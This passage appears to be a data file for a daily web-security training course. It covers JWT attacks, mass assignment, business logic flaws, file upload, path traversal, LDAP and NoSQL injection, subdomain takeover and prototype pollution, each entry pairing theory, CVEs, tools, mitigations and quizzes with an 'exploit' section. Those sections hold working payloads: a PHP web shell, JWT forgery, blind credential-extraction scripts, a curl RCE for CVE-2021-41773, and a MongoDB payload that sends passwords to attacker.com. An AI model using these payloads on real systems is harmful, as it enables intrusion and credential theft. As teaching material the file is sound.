    theory: `A JWT consists of three base64url-encoded parts: Header.Payload.Signature. The header specifies the signing algorithm. Critical vulnerabilities:

**Algorithm confusion (alg:none):** Setting the algorithm to 'none' removes signature validation in some libraries.

**RS256 to HS256 confusion:** If an RS256-signed token switches to HS256, the server might validate using the *public key* as the HMAC secret — which the attacker knows.

**Weak secret brute force:** HS256 tokens signed with weak secrets can be cracked with hashcat.

**JWT header injection (kid/jku/x5u):** The 'kid' (key ID) parameter can be manipulated to point to attacker-controlled keys or inject SQL/path traversal.`,
    cve: [
      { id: "CVE-2015-9235", name: "JWT alg:none bypass", desc: "jsonwebtoken library in Node.js accepted tokens with alg:none, bypassing signature verification." },
      { id: "CVE-2022-21449", name: "Java JWT ECDSA bypass (Psychic Signatures)", desc: "Java 15-18 ECDSA signature verification accepted all-zero signatures." },
      { id: "CVE-2020-28042", name: "python-jwt null signature", desc: "python-jwt library accepted tokens without signature verification under certain conditions." }
    ],
    exploit: `**1. Algorithm None attack:**
\`\`\`
# Original token header (base64url decoded):
{"alg":"HS256","typ":"JWT"}

# Tamper to:
{"alg":"none","typ":"JWT"}

# Remove signature:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
# Note the trailing dot with empty signature
\`\`\`

**2. RS256 to HS256 confusion:**
\`\`\`python
import jwt

public_key = open('public.pem').read()
# Server uses RS256 but attacker sends HS256 signed with public key
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,        # Public key as HMAC secret!
    algorithm="HS256"
)
\`\`\`

**3. Crack weak HS256 secret with hashcat:**
\`\`\`bash
hashcat -a 0 -m 16500 eyJ...token...xyz /usr/share/wordlists/rockyou.txt
\`\`\`

**4. kid header injection (SQL):**
\`\`\`json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_secret' -- -"}
\`\`\`
Then sign token with 'attacker_secret'.

**Tool - jwt_tool:**
\`\`\`bash
python3 jwt_tool.py <token> -T    # Tamper mode
python3 jwt_tool.py <token> -X a  # Algorithm none attack
python3 jwt_tool.py <token> -C -d wordlist.txt  # Crack
\`\`\``,
    tools: ["jwt_tool", "hashcat", "CyberChef", "Burp JWT Editor extension"],
    mitigation: "Reject tokens with alg:none. Pin expected algorithm. Use strong random secrets (256+ bits). Validate all header parameters. Keep JWT libraries updated. Prefer asymmetric keys for distributed systems.",
    quiz: [
      { q: "What attack sets the JWT algorithm to 'none' to bypass signature verification?", options: ["CSRF attack", "Algorithm none / alg confusion attack", "Padding oracle attack", "Birthday attack"], answer: 1 },
      { q: "In RS256 to HS256 confusion, the attacker signs the forged token with:", options: ["The private key", "A random key", "The server's public key as HMAC secret", "An empty string"], answer: 2 },
      { q: "Which hashcat mode is used to crack JWT tokens?", options: ["16500", "1000", "3200", "13400"], answer: 0 },
      { q: "The JWT 'kid' (Key ID) header parameter can be exploited to perform:", options: ["XSS injection", "SQL injection or path traversal to control key material", "CSRF attacks", "Rate limit bypass"], answer: 1 },
      { q: "What is the minimum recommended bit length for HS256 JWT secrets?", options: ["64 bits", "128 bits", "256 bits", "512 bits"], answer: 2 }
    ]
  },
  {
    day: 11,
    date: "2026-07-04",
    title: "Mass Assignment / Parameter Pollution",
    severity: "HIGH",
    category: "Logic Flaws",
    icon: "📦",
    definition: "Mass Assignment occurs when a framework automatically binds HTTP request parameters to object properties without filtering, allowing attackers to set properties they shouldn't control — like admin flags, prices, or account balances. HTTP Parameter Pollution sends duplicate parameters to confuse server-side parsing.",
    theory: `Modern frameworks (Rails, Spring, Django, Laravel) offer mass assignment features that auto-populate model attributes from request data. If developers don't use allowlists (strong parameters), attackers include extra fields.

**Mass Assignment Examples:**
- Add \`role=admin\` to registration request
- Set \`price=0\` on an order
- Set \`isVerified=true\` on email verification
- Modify \`balance=99999\` in a profile update

**HTTP Parameter Pollution (HPP):**
Sending \`param=value1&param=value2\` — different servers parse differently:
- PHP/Apache: last value wins
- ASP.NET: first value wins
- JSP: array of values

This can bypass WAF rules or exploit server-side logic.`,
    cve: [
      { id: "CVE-2012-5664", name: "Rails Mass Assignment", desc: "Ruby on Rails critical mass assignment flaw allowed privilege escalation via any model." },
      { id: "CVE-2021-22965", name: "Spring Mass Assignment via DataBinder", desc: "Spring MVC DataBinder allowed unintended field binding." }
    ],
    exploit: `**1. Mass Assignment - Registration escalation:**
\`\`\`http
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "hacker",
  "password": "pass123",
  "email": "hacker@evil.com",
  "role": "admin",         ← Added by attacker
  "isVerified": true,      ← Added by attacker
  "balance": 99999         ← Added by attacker
}
\`\`\`

**2. Finding hidden fields:**
\`\`\`bash
# Check API documentation
# Check source code if available
# Look at GET /api/user response for all fields:
{
  "id": 123,
  "username": "user",
  "email": "user@test.com",
  "role": "user",        ← Try setting this in POST/PUT
  "verified": false      ← Try setting this
}
\`\`\`

**3. HTTP Parameter Pollution:**
\`\`\`
# WAF blocks: ?admin=true
# Try HPP: ?admin=false&admin=true
# Or: ?admin[]=false&admin[]=true

# Price manipulation:
POST /checkout
amount=100&amount=0&productId=1
\`\`\`

**4. JSON parameter pollution:**
\`\`\`json
{"price": 100, "price": 0}
\`\`\``,
    tools: ["Burp Suite", "Arjun (parameter discovery)", "ParamSpider"],
    mitigation: "Use allowlists (strong parameters) to explicitly define assignable fields. Never auto-bind all request fields to model objects. Validate and sanitize all inputs. Use separate DTOs for input.",
    quiz: [
      { q: "Mass Assignment attacks work because:", options: ["The server has no firewall", "Frameworks automatically bind all request parameters to model objects without filtering", "SQL queries are not parameterized", "Passwords are stored in plaintext"], answer: 1 },
      { q: "Which Ruby on Rails feature was the source of a critical mass assignment CVE?", options: ["ActiveRecord default scope", "attr_accessible not enforced", "before_filter bypass", "Rack middleware flaw"], answer: 1 },
      { q: "HTTP Parameter Pollution sends duplicate parameters primarily to:", options: ["Increase request speed", "Confuse parsing logic or bypass WAF/application filters", "Encrypt the request", "Add CSRF protection"], answer: 1 },
      { q: "What is the recommended mitigation for mass assignment?", options: ["Use HTTPS only", "Implement allowlists (strong parameters) restricting which fields are bindable", "Hash all passwords", "Add CAPTCHA"], answer: 1 },
      { q: "Which tool is used to discover hidden or undocumented HTTP parameters?", options: ["sqlmap", "Arjun", "nikto", "hydra"], answer: 1 }
    ]
  },
  {
    day: 12,
    date: "2026-07-05",
    title: "Business Logic Vulnerabilities",
    severity: "HIGH",
    category: "Logic Flaws",
    icon: "💡",
    definition: "Business logic vulnerabilities are flaws in the design and implementation of application workflows that allow attackers to manipulate legitimate functionality in unintended ways. They cannot be detected by scanners — they require understanding how the application is supposed to work.",
    theory: `Unlike technical vulnerabilities, business logic flaws exploit correct code that implements incorrect logic. They're highly context-dependent.

**Common patterns:**
- **Negative quantity purchases**: Buy -1 items to get a refund credit
- **Price tampering**: Modify item prices during checkout
- **Workflow bypass**: Skip required steps (payment → go directly to order confirmation)
- **Discount stacking**: Apply multiple mutually exclusive discounts
- **Coupon reuse**: Reapply single-use coupons
- **Free trial bypass**: Extend trials or reset trial counters
- **Balance manipulation**: Exploit rounding errors or negative balances
- **Account takeover via logic**: Exploit weak password reset flows`,
    cve: [
      { id: "BL-001", name: "Shopify Balance Bypass", desc: "Negative balance manipulation allowing purchases without payment (Bug Bounty report)." },
      { id: "BL-002", name: "PayPal Negative Amount", desc: "Sending negative payment amounts reversed money flow." }
    ],
    exploit: `**1. Negative quantity:**
\`\`\`http
POST /cart/add HTTP/1.1
{"productId": 123, "quantity": -1, "price": 50.00}
# Result: cart total goes negative → free money
\`\`\`

**2. Price manipulation (client-side price):**
\`\`\`http
POST /checkout HTTP/1.1
{"items": [{"id": 1, "price": 0.01, "quantity": 1}]}
\`\`\`

**3. Workflow step skipping:**
\`\`\`
Normal: /step1 → /step2 → /payment → /confirm
Attack: Navigate directly to /confirm?order_id=123
        (if server doesn't verify payment completed)
\`\`\`

**4. Coupon abuse:**
\`\`\`
# Apply coupon, then remove item, re-add at discounted price
# Use race condition to apply coupon twice
\`\`\`

**5. Password reset logic flaw:**
\`\`\`
1. Request reset for victim@example.com
2. Change email in reset request to victim@example.com 
   but receive token at attacker@example.com
3. Use token to reset victim's password

# Or: reset token not tied to specific account
POST /reset-password
{"token": "valid_token_from_own_account", "email": "victim@example.com"}
\`\`\``,
    tools: ["Burp Suite", "Manual testing", "Postman", "Browser DevTools"],
    mitigation: "Validate all business logic server-side. Never trust client-supplied prices/quantities. Enforce workflow sequences server-side. Tie reset tokens to specific accounts and emails. Implement comprehensive logging.",
    quiz: [
      { q: "Why can't automated scanners reliably detect business logic vulnerabilities?", options: ["Scanners are too slow", "They require understanding application-specific intended behavior, not just technical patterns", "Scanners don't handle POST requests", "They only work on REST APIs"], answer: 1 },
      { q: "Sending a negative quantity in a purchase request is an example of:", options: ["SQL injection", "Business logic vulnerability exploiting improper input validation", "SSRF", "XSS"], answer: 1 },
      { q: "A workflow bypass attack typically involves:", options: ["Brute-forcing login credentials", "Skipping required steps (like payment) by directly accessing later workflow endpoints", "Injecting SQL into forms", "Stealing session cookies"], answer: 1 },
      { q: "To prevent price tampering, the correct approach is:", options: ["Validate price on the client side", "Store and calculate prices server-side based on product IDs, never trusting client-submitted prices", "Use HTTPS", "Add a CAPTCHA at checkout"], answer: 1 },
      { q: "What makes password reset tokens vulnerable to account takeover via logic flaws?", options: ["They're too long", "Tokens not tied to a specific account/email, allowing token reuse across accounts", "They expire too quickly", "They use HTTPS"], answer: 1 }
    ]
  },
  {
    day: 13,
    date: "2026-07-06",
    title: "File Upload Vulnerabilities",
    severity: "CRITICAL",
    category: "Server-Side Attacks",
    icon: "📁",
    definition: "File upload vulnerabilities occur when an application allows users to upload files without sufficiently validating their name, type, content, or size. Attackers upload malicious files (web shells, polyglots, malware) to achieve remote code execution, XSS, or server compromise.",
    theory: `File upload attacks range from trivial to complex depending on the validation in place.

**Attack tiers:**
1. **No validation**: Direct .php/.jsp/.aspx shell upload → instant RCE
2. **Extension blacklist bypass**: Rename to .php5, .phtml, .pHp, .PhP, .php%00.jpg
3. **MIME type bypass**: Change Content-Type to image/jpeg while keeping .php extension
4. **Double extension**: shell.php.jpg (parsed as PHP if Apache misconfigured)
5. **Null byte**: shell.php%00.jpg (truncates at null byte)
6. **Polyglot files**: Valid image file that is also valid PHP/JavaScript
7. **Path traversal in filename**: ../../../var/www/html/shell.php
8. **Race condition**: Upload, execute before antivirus scans
9. **XXE via SVG/DOCX upload**
10. **Stored XSS via SVG**`,
    cve: [
      { id: "CVE-2021-22205", name: "GitLab File Upload RCE", desc: "ExifTool parsing of uploaded images allowed RCE via crafted DjVu file." },
      { id: "CVE-2020-3452", name: "Cisco ASA Path Traversal via Upload", desc: "File upload path traversal allowing arbitrary file read." },
      { id: "CVE-2022-26134", name: "Confluence Upload RCE", desc: "File upload combined with OGNL injection allowed pre-auth RCE." }
    ],
    exploit: `**Step 1: Test basic upload:**
\`\`\`php
<?php system($_GET['cmd']); ?>
\`\`\`
Save as shell.php, upload, navigate to upload path.

**Step 2: Extension bypass techniques:**
\`\`\`
shell.php → shell.php5
shell.php → shell.phtml
shell.php → shell.pHp (case variation)
shell.php → shell.php%00.jpg (null byte, older PHP)
shell.php → shell.php.jpg (double extension)
\`\`\`

**Step 3: MIME type bypass in Burp:**
\`\`\`http
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← Changed from application/x-php

<?php system($_GET['cmd']); ?>
\`\`\`

**Step 4: Polyglot file (image + PHP):**
\`\`\`bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
\`\`\`

**Step 5: SVG XSS:**
\`\`\`xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
\`\`\`

**Finding upload paths:**
\`\`\`bash
gobuster dir -u https://victim.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Look for /uploads/, /files/, /images/, /media/
\`\`\``,
    tools: ["Burp Suite", "exiftool", "weevely", "msfvenom", "upload-bypass"],
    mitigation: "Validate file content (magic bytes), not just extension/MIME. Store uploads outside webroot. Rename files on upload. Serve files via separate domain. Use antivirus scanning. Implement strict allowlist of permitted types.",
    quiz: [
      { q: "Which file extension bypass works when Apache is misconfigured to parse multiple extensions?", options: ["shell.jpg.exec", "shell.php.jpg", "shell.txt.sh", "shell.html.asp"], answer: 1 },
      { q: "What is a polyglot file in the context of file upload attacks?", options: ["A file with multiple languages", "A file that is simultaneously valid in two formats (e.g., image + PHP script)", "An encrypted file", "A file over 10MB"], answer: 1 },
      { q: "CVE-2021-22205 affected GitLab because of unsafe parsing by which tool?", options: ["ImageMagick", "ExifTool", "FFmpeg", "LibreOffice"], answer: 1 },
      { q: "The most secure way to serve user-uploaded files is:", options: ["Allow all file types but scan with antivirus", "Serve them from the same webroot", "Store outside webroot and serve via a separate domain using a content-disposition header", "Rename them to .txt"], answer: 2 },
      { q: "An SVG file upload can lead to which client-side vulnerability?", options: ["SQLi", "SSRF", "Stored XSS", "Command injection"], answer: 2 }
    ]
  },
  {
    day: 14,
    date: "2026-07-07",
    title: "Path Traversal / Directory Traversal",
    severity: "HIGH",
    category: "Server-Side Attacks",
    icon: "📂",
    definition: "Path traversal (directory traversal) allows attackers to read files outside the intended directory by manipulating file paths with sequences like '../'. Successful attacks can expose sensitive files like /etc/passwd, application configs, private keys, and source code.",
    theory: `Applications that read files based on user input are vulnerable if they don't canonicalize paths before use. 

**Common injection points:**
- \`?file=report.pdf\`
- \`?template=home\`
- \`?lang=en\`
- \`?include=header.php\`
- File download endpoints
- Log viewer functionality

**Bypass techniques:**
- Classic: \`../../etc/passwd\`
- URL encoded: \`..%2F..%2Fetc%2Fpasswd\`
- Double URL encoded: \`..%252F..%252Fetc%252Fpasswd\`
- Unicode: \`..%c0%af..%c0%afetc%c0%afpasswd\`
- Windows: \`..\\..\\\`
- Null byte: \`../../etc/passwd%00.jpg\`
- With base path: \`....//....//etc/passwd\` (when ../ is stripped non-recursively)`,
    cve: [
      { id: "CVE-2021-41773", name: "Apache Path Traversal", desc: "Apache HTTP Server 2.4.49 path traversal and RCE via URL path normalization flaw." },
      { id: "CVE-2019-0232", name: "Apache Tomcat CGI Path Traversal", desc: "Windows CGI script path traversal allowing command injection." },
      { id: "CVE-2022-22536", name: "SAP Internet Communication Manager", desc: "HTTP request smuggling + path traversal allowing unauthenticated access." }
    ],
    exploit: `**Basic test:**
\`\`\`
GET /download?file=../../../etc/passwd HTTP/1.1
GET /view?template=../../../../etc/shadow
\`\`\`

**Encoded bypasses:**
\`\`\`
/download?file=..%2F..%2F..%2Fetc%2Fpasswd
/download?file=..%252F..%252F..%252Fetc%252Fpasswd
/download?file=....//....//....//etc//passwd
\`\`\`

**Windows targets:**
\`\`\`
GET /download?file=..\\..\\..\\\windows\win.ini
GET /download?file=../../../../windows/system32/drivers/etc/hosts
\`\`\`

**High-value Linux targets:**
\`\`\`
/etc/passwd          # User list
/etc/shadow          # Password hashes (if root)
/etc/hosts           # Network configuration
~/.ssh/id_rsa        # Private SSH keys
/proc/self/environ   # Environment variables
/var/log/apache2/access.log  # Web server logs
/app/config/.env     # Application secrets
/proc/self/fd/0      # Open file descriptors
\`\`\`

**CVE-2021-41773 exploit:**
\`\`\`bash
curl "http://victim.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# RCE via mod_cgi:
curl -v --data 'echo Content-Type: text/plain; echo; id' "http://victim.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
\`\`\``,
    tools: ["Burp Suite", "dotdotpwn", "LFISuite", "ffuf"],
    mitigation: "Use realpath()/canonicalize() to resolve absolute paths before use. Validate path stays within allowed base directory. Use file allowlists. Avoid user-controlled file path parameters entirely.",
    quiz: [
      { q: "What does '..%252F' represent as a path traversal bypass?", options: ["Unicode traversal", "Double URL encoding of '../'", "Null byte injection", "Base64 encoding"], answer: 1 },
      { q: "CVE-2021-41773 was a path traversal in which web server?", options: ["Nginx", "IIS", "Apache HTTP Server 2.4.49", "Tomcat"], answer: 2 },
      { q: "Which Linux file is a high-value path traversal target for SSH key theft?", options: ["/etc/hosts", "~/.ssh/id_rsa", "/var/log/syslog", "/tmp/test"], answer: 1 },
      { q: "What function should be used in code to prevent path traversal?", options: ["str_replace('../', '')", "realpath() with base directory validation", "strlen() check", "md5() of path"], answer: 1 },
      { q: "The bypass '....//....//etc/passwd' works when the server:", options: ["URL-decodes the path", "Strips '../' but only non-recursively", "Validates file extensions", "Checks Content-Type"], answer: 1 }
    ]
  },
  {
    day: 15,
    date: "2026-07-08",
    title: "LDAP Injection",
    severity: "HIGH",
    category: "Injection",
    icon: "🗂️",
    definition: "LDAP injection occurs when user input is incorporated into LDAP queries without proper sanitization. Attackers manipulate the query structure to bypass authentication, extract directory data, or enumerate users and groups in an LDAP directory (Active Directory, OpenLDAP).",
    theory: `LDAP (Lightweight Directory Access Protocol) is used for authentication in enterprises. LDAP queries use a filter syntax: \`(attribute=value)\`.

**Special LDAP characters:**
\`*\`, \`(\`, \`)\`, \\\`, \`NUL\`

**Attack scenarios:**
- **Authentication bypass**: Injecting wildcards to match any password
- **Data extraction**: Enumerate all users, groups, attributes
- **Blind LDAP injection**: Boolean-based extraction when no output is returned

**Common LDAP filter patterns:**
\`\`\`
(uid=username)
(&(uid=user)(password=pass))
(|(uid=user1)(uid=user2))
\`\`\``,
    cve: [
      { id: "CVE-2021-26701", name: ".NET LDAP Injection", desc: "Improper neutralization of LDAP special elements in .NET applications." },
      { id: "CVE-2020-35529", name: "SAP LDAP Injection", desc: "LDAP injection in SAP Business Objects allowing authentication bypass." }
    ],
    exploit: `**Authentication bypass:**
\`\`\`
# Normal query: (&(uid=USER)(password=PASS))
# Inject in username field:
Username: admin)(&
Password: anything

# Resulting query: (&(uid=admin)(&)(password=anything))
# The (&) is always true → bypasses password check!
\`\`\`

**Wildcard bypass (username=*):**
\`\`\`
Username: *
Password: *
# Matches ANY user → logs in as first user found
\`\`\`

**Data extraction via blind LDAP:**
\`\`\`
# Test if first char of admin password is 'a':
Username: admin)(password=a*
# If login succeeds → first char is 'a'
# Iterate through chars to extract full password
\`\`\`

**Enumerate users:**
\`\`\`
# Inject OR condition to dump all users
Username: *)(uid=*
# Query: (&(uid=*)(uid=*)(password=anything))
\`\`\`

**Python script to automate blind LDAP extraction:**
\`\`\`python
import requests, string

chars = string.ascii_letters + string.digits
password = ""
for _ in range(20):
    for c in chars:
        payload = f"admin)(password={password + c}*"
        r = requests.post('/login', data={"user": payload, "pass": "x"})
        if "Welcome" in r.text:
            password += c
            break
\`\`\``,
    tools: ["Burp Suite", "ldap3 (Python)", "LDAPWordlistHarvest", "JXplorer"],
    mitigation: "Escape LDAP special characters in all user input. Use parameterized LDAP APIs. Apply principle of least privilege to LDAP service accounts. Validate and sanitize all inputs before LDAP queries.",
    quiz: [
      { q: "Which character is commonly used in LDAP injection to create wildcard matches?", options: ["%", "#", "*", "@"], answer: 2 },
      { q: "In an LDAP authentication bypass, the attacker's goal is to:", options: ["Read all LDAP attributes", "Make the filter always evaluate to true regardless of password", "Delete directory entries", "Change passwords"], answer: 1 },
      { q: "Which LDAP filter syntax uses AND logic?", options: ["|(filter)", "&(filter)", "!(filter)", "+(filter)"], answer: 1 },
      { q: "What technique is used for LDAP injection when no direct output is returned?", options: ["Error-based injection", "Time-based blind injection", "Boolean-based blind LDAP injection", "Out-of-band injection"], answer: 2 },
      { q: "What is the correct mitigation for LDAP injection?", options: ["Use MD5 hashing", "Escape special characters: * ( ) \\ NUL in all user input before LDAP queries", "Use GET instead of POST", "Add CAPTCHA"], answer: 1 }
    ]
  },
  {
    day: 16,
    date: "2026-07-09",
    title: "Subdomain Takeover",
    severity: "HIGH",
    category: "Recon & Infrastructure",
    icon: "🌍",
    definition: "Subdomain takeover occurs when a DNS record points to an external service (Heroku, GitHub Pages, S3, etc.) that no longer exists. An attacker claims the abandoned service and takes control of the subdomain — hosting phishing pages, stealing cookies, or bypassing CSP.",
    theory: `Companies create subdomains pointing to third-party services. If the service is deleted but the DNS record remains (dangling DNS), anyone can claim that service and 'take over' the subdomain.

**Common services vulnerable to takeover:**
- GitHub Pages (CNAME to username.github.io)
- Heroku (CNAME to app.herokuapp.com)
- Amazon S3 (CNAME to bucket.s3.amazonaws.com)
- Fastly, Azure, Shopify, Zendesk
- AWS CloudFront, Netlify, Surge.sh

**Impact:**
- Phishing under trusted company domain
- Stealing cookies with cookie scope
- Bypassing Content Security Policy
- OAuth token theft (if subdomain is an allowed redirect_uri)
- Hosting malware under trusted domain`,
    cve: [
      { id: "SD-2019-001", name: "Uber Subdomain Takeover", desc: "Multiple Uber subdomains were taken over via abandoned Heroku/S3 references." },
      { id: "SD-2020-002", name: "Microsoft Subdomain Takeover", desc: "Researcher took over multiple *.microsoft.com subdomains via abandoned Azure deployments." }
    ],
    exploit: `**Step 1: Find subdomains**
\`\`\`bash
# Passive recon
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass_subs.txt
assetfinder --subs-only target.com

# Certificate transparency
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'
\`\`\`

**Step 2: Find dangling CNAMEs**
\`\`\`bash
cat subs.txt | while read sub; do
  cname=$(dig CNAME $sub +short)
  if [ -n "$cname" ]; then
    # Check if CNAME target exists
    curl -s -o /dev/null -w "%{http_code}" http://$cname
    echo "$sub → $cname"
  fi
done
\`\`\`

**Step 3: Check for fingerprints**
\`\`\`
"There isn't a GitHub Pages site here"  → GitHub Pages takeover
"No Such Bucket"                         → S3 takeover
"Heroku | No such app"                   → Heroku takeover
"404 Not Found - Fastly"                 → Fastly takeover
\`\`\`

**Step 4: Claim the service**
\`\`\`bash
# GitHub Pages example:
# 1. Create repo: attacker/victim-subdomain-name
# 2. Add CNAME file with: sub.victim.com
# 3. Enable GitHub Pages → you now serve content at sub.victim.com!
\`\`\`

**Tools:**
\`\`\`bash
subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json
nuclei -l subs.txt -t takeovers/
\`\`\``,
    tools: ["subfinder", "amass", "subjack", "nuclei", "can-i-take-over-xyz"],
    mitigation: "Regularly audit DNS records. Remove DNS entries before decommissioning services. Use automated monitoring for dangling CNAMEs. Implement strict cookie security policies (SameSite, Secure, HttpOnly).",
    quiz: [
      { q: "Subdomain takeover occurs primarily because of:", options: ["Weak passwords on subdomains", "DNS CNAME records pointing to unclaimed/deleted external services", "SQL injection in DNS servers", "Missing HTTPS certificates"], answer: 1 },
      { q: "The message 'No Such Bucket' when visiting a subdomain indicates:", options: ["GitHub Pages takeover opportunity", "Amazon S3 subdomain takeover opportunity", "Heroku takeover opportunity", "Fastly takeover opportunity"], answer: 1 },
      { q: "Which tool specifically checks subdomains for takeover fingerprints?", options: ["nmap", "sqlmap", "subjack", "hydra"], answer: 2 },
      { q: "Why is subdomain takeover dangerous even without server access?", options: ["It allows SQL injection", "Attacker can serve malicious content under a trusted domain, steal cookies, and bypass CSP/OAuth restrictions", "It enables DoS attacks", "It compromises the database"], answer: 1 },
      { q: "Certificate Transparency (crt.sh) is useful for subdomain takeover because:", options: ["It shows SSL vulnerabilities", "It reveals all subdomains that have ever had SSL certificates issued", "It lists DNS servers", "It shows open ports"], answer: 1 }
    ]
  },
  {
    day: 17,
    date: "2026-07-10",
    title: "NoSQL Injection",
    severity: "HIGH",
    category: "Injection",
    icon: "🗃️",
    definition: "NoSQL injection targets databases like MongoDB, CouchDB, and Redis that use non-SQL query formats. Attackers inject operators or manipulate query objects to bypass authentication, extract data, or modify records — similar to SQL injection but using the target database's own query language.",
    theory: `NoSQL databases use JSON-like queries. MongoDB uses operators like \`$eq\`, \`$gt\`, \`$where\`, \`$regex\`. If user input is directly embedded in queries, attackers inject these operators.

**MongoDB Injection types:**
- **Operator injection**: Inject \`$gt\`, \`$ne\`, \`$regex\` via JSON body
- **JavaScript injection via $where**: Execute JS code server-side
- **Array injection**: Bypass equality checks

**Example vulnerable code:**
\`\`\`javascript
User.findOne({
  username: req.body.username,
  password: req.body.password
});
\`\`\`
If body is parsed as JSON, attacker sends: \`{"username": "admin", "password": {"$gt": ""}}\``,
    cve: [
      { id: "CVE-2021-22931", name: "Node.js BSON NoSQL injection", desc: "MongoDB Node.js driver allowed operator injection via BSON parsing." },
      { id: "CVE-2019-7610", name: "Kibana NoSQL injection", desc: "Prototype pollution leading to RCE via NoSQL-like query manipulation." }
    ],
    exploit: `**1. Authentication bypass (MongoDB):**
\`\`\`json
// Normal login:
{"username": "admin", "password": "secret"}

// Injection - password must be greater than empty string:
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": ".*"}}
\`\`\`

**2. URL parameter injection:**
\`\`\`
GET /users?username[$ne]=invalid&password[$gt]=
\`\`\`

**3. $where JavaScript injection (MongoDB):**
\`\`\`json
{"$where": "function() { return this.username == 'admin'; }"}

// RCE if $where is enabled:
{"$where": "function() { return (function(){var x = new XMLHttpRequest(); x.open('GET','http://attacker.com/?c='+this.password,false);x.send(); return true;})(); }"}
\`\`\`

**4. Blind NoSQL injection (extract data char by char):**
\`\`\`python
import requests, string

target = "http://victim.com/login"
password = ""
charset = string.ascii_letters + string.digits + "!@#$"

for _ in range(30):
    for c in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password + c}"}
        }
        r = requests.post(target, json=payload)
        if "Welcome" in r.text:
            password += c
            break
\`\`\``,
    tools: ["Burp Suite", "nosqlmap", "NoSQLAttacker", "mongoclient"],
    mitigation: "Sanitize input by stripping operator characters. Use ODM (Mongoose) with schema validation. Disable $where and JavaScript execution in MongoDB. Use allowlists for query fields.",
    quiz: [
      { q: "What MongoDB operator is injected to bypass password checks with 'not equal to anything'?", options: ["$lt", "$ne", "$or", "$and"], answer: 1 },
      { q: "NoSQL injection via URL parameters often uses which syntax?", options: ["param[sql]=value", "param[$operator]=value", "param{operator}=value", "param!=value"], answer: 1 },
      { q: "Which MongoDB operator allows JavaScript code execution server-side, enabling severe injection?", options: ["$text", "$regex", "$where", "$lookup"], answer: 2 },
      { q: "Which tool is specifically designed for automated NoSQL injection testing?", options: ["sqlmap", "nosqlmap", "hydra", "nikto"], answer: 1 },
      { q: "The vulnerable code pattern that leads to NoSQL injection is:", options: ["Using parameterized queries", "Directly embedding user-supplied JSON objects into database queries without sanitization", "Using HTTPS", "Hashing passwords"], answer: 1 }
    ]
  },
  {
    day: 18,
    date: "2026-07-11",
    title: "Prototype Pollution",
    severity: "HIGH",
    category: "Client & Server Vulnerabilities",
    icon: "⚗️",
    definition: "Prototype pollution is a JavaScript vulnerability where an attacker can inject properties into the Object.prototype — the base object that all JavaScript objects inherit from. This can lead to logic bypass, property injection, denial of service, or remote code execution in Node.js applications.",
    theory: `In JavaScript, every object inherits properties from Object.prototype. If an application uses user-supplied keys to set object properties recursively without sanitization, an attacker can set properties on Object.prototype itself.

**Dangerous sink patterns:**
- Deep merge functions: \`merge(obj, userInput)\`
- Clone utilities: \`_.merge\`, \`deepmerge\`
- Property setting via path: \`set(obj, user.path, value)\`

**Attack impact:**
- **Client-side**: Override application logic, XSS bypasses, CSP bypasses
- **Server-side (Node.js)**: Property injection into all objects → RCE via command injection in child_process, template engines, etc.

**Key insight:** If you set \`__proto__.admin = true\`, then every object gains \`obj.admin === true\` — even when the app checks \`user.admin\`.`,
    cve: [
      { id: "CVE-2019-7609", name: "Kibana Prototype Pollution RCE", desc: "Kibana's Timelion visualizer allowed prototype pollution leading to RCE." },
      { id: "CVE-2021-3757", name: "immer Prototype Pollution", desc: "immer library (used in Redux) allowed prototype pollution via draft objects." },
      { id: "CVE-2019-10744", name: "lodash Prototype Pollution", desc: "lodash _.merge, _.setWith, _.set vulnerable to prototype pollution." }
    ],
    exploit: `**Basic prototype pollution:**
\`\`\`javascript
// Vulnerable merge function:
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// Payload:
const malicious = JSON.parse('{"__proto__": {"admin": true}}');
merge({}, malicious);

// Now ALL objects have admin=true:
const user = {};
console.log(user.admin); // true!
\`\`\`

**Via URL query strings:**
\`\`\`
GET /search?__proto__[admin]=true
GET /search?constructor[prototype][admin]=true
\`\`\`

**Server-side RCE via prototype pollution:**
\`\`\`javascript
// If app uses child_process.spawn:
// Pollute shell property:
{"__proto__": {"shell": "node", "env": {"NODE_OPTIONS": "--require /proc/self/fd/0"}, "input": "process.mainModule.require('child_process').execSync('id > /tmp/pwned')"}}
\`\`\`

**Testing with Burp:**
- Send JSON body with \`__proto__\` keys
- Check if reflected properties appear in responses
- Use PP Gadget Finder tool`,
    tools: ["Burp Suite", "ppmap", "Proto Pollution Scanner", "DOMPurify bypass testing"],
    mitigation: "Use Object.create(null) for dictionaries. Sanitize keys (block __proto__, constructor, prototype). Use Map instead of plain objects. Keep lodash/immer/deepmerge updated. Freeze Object.prototype in critical code.",
    quiz: [
      { q: "Prototype pollution attacks the __proto__ property because:", options: ["It's always undefined", "All JavaScript objects inherit from Object.prototype, so polluting it affects every object", "It's encrypted", "It's not accessible in modern JS"], answer: 1 },
      { q: "Which popular utility library had a critical prototype pollution vulnerability (CVE-2019-10744)?", options: ["Axios", "Moment.js", "lodash", "Express"], answer: 2 },
      { q: "Which alternative data structure is immune to prototype pollution?", options: ["Plain Object {}", "Array []", "Map", "WeakRef"], answer: 2 },
      { q: "What URL parameter pattern is used to test for prototype pollution via query strings?", options: ["?sql=DROP TABLE", "?__proto__[property]=value", "?../../../etc/passwd", "?{{7*7}}"], answer: 1 },
